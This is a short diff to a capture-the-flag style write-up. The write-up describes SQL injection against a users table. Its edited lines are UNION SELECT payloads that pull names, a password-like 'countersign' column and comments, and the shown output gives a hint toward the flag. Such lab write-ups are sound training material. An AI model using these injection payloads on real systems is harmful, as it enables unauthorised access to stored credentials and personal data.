@@ -8,12 +8,12 @@ So, we could see all the columns of the users table -> surname, first_name, comm
 
 With this one, it prints the value of the given fields : 
 
-`ID: 1=1 UNION SELECT first_name, countersign FROM users`
+`1=1 UNION SELECT first_name, countersign FROM users`
 
 So we tried with every fields of the users tables and we found hints to access to the flag
 
 ```
-ID: 1=1 UNION SELECT commentaire , last_name FROM users 
+1=1 UNION SELECT commentaire , last_name FROM users 
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : GetThe
 ```
